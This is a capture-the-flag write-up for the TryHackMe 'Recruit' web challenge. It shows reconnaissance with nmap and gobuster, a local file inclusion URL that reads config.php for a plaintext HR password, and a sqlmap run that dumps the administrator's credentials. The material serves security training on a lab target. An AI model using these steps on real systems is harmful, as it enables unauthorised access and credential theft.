# [Recruit](https://tryhackme.com/room/recruitwebchallenge)

## Infiltrate Recruit's new portal. Map the site, hunt for flaws, and gain unauthorised access

# Recruit Challenge

**Recruit** has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the **administrator?**

### What is the flag value after logging in as a normal user?

1. Perform a full port scan to enumerate all open ports and running services on the target machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9a:63:19:7a:65:33:5e:76:ca:ed:33:d8:93:a7:cb:93 (RSA)
|   256 c7:83:d6:a4:cf:07:e8:83:26:e4:68:73:d5:5e:69:9a (ECDSA)
|_  256 5b:8c:fe:d8:4f:5b:1f:17:ca:45:3c:49:92:10:b4:58 (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Recruit
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Run a directory brute-force against the web server to uncover hidden paths and files:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```
mail                 (Status: 301) [Size: 315] [--> http://<TARGET_IP>/mail/]
assets               (Status: 301) [Size: 317] [--> http://<TARGET_IP>/assets/]
javascript           (Status: 301) [Size: 321] [--> http://<TARGET_IP>/javascript/]
phpmyadmin           (Status: 301) [Size: 321] [--> http://<TARGET_IP>/phpmyadmin/]
server-status        (Status: 403) [Size: 279]
```

3. Navigate to `http://<TARGET_IP>/mail/` to browse the directory listing, then open `http://<TARGET_IP>/mail/mail.log` to read the server's local mail spool. It contains an internal email with sensitive deployment details:

```log
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: 4F1A2203F: removed
```

> This email discloses three critical pieces of information: the HR username is `hr`, the HR password is stored in plaintext inside `config.php`, and an API documentation page is live on the server. The fact that administrator credentials reside in the database will be relevant for the second flag.

4. Exploit the LFI vulnerability in `file.php` to read the application configuration file directly from disk using the `/` URI wrapper: `http://<TARGET_IP>//file.php?cv=file:///var/www/html/config.php`

**Results:**

```php
<?php

/*
|--------------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------------
*/

$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';

/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/

$API_ENABLED     = true;
$API_VERSION     = 'v1';


?>
```

5. Navigate to `http://<TARGET_IP>` and log in with the credentials `hr:hrpassword123` to retrieve the first flag:

<img width="1131" height="209" alt="SCREEN01" src="https://github.com/user-attachments/assets/a3c15c63-d327-4e4e-a60e-6f7734f8bfe0" />

---

### What is the flag value after logging in as admin?

1. While logged in as hr, Locate the candidate name search field and enter a single quote (`'`) as input, then submit the form. The server responds with an SQL error message, confirming that user input is interpolated directly into a SQL query without sanitisation.

2. Set up Burp Suite to intercept traffic and resubmit the search form. In the **Proxy > HTTP history** tab, right-click the captured GET request and select **Save item** to write the raw HTTP request to a file named `request` on your attacking machine.

3. Pass the saved request file to sqlmap to automatically identify the injection point, enumerate all databases, and dump their contents:

```bash
sqlmap -r request --dbs --dump
```

**Results:**

```
Database: recruit_db
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | admin@001admin | admin    |
+----+----------------+----------+
```

5. Navigate to `http://<TARGET_IP>` and log in with the credentials `admin:admin@001admin` to retrieve the second flag.

<img width="1136" height="209" alt="SCREEEN02" src="https://github.com/user-attachments/assets/7312b9de-3c3b-4eed-91ad-c4c7a0752360" />
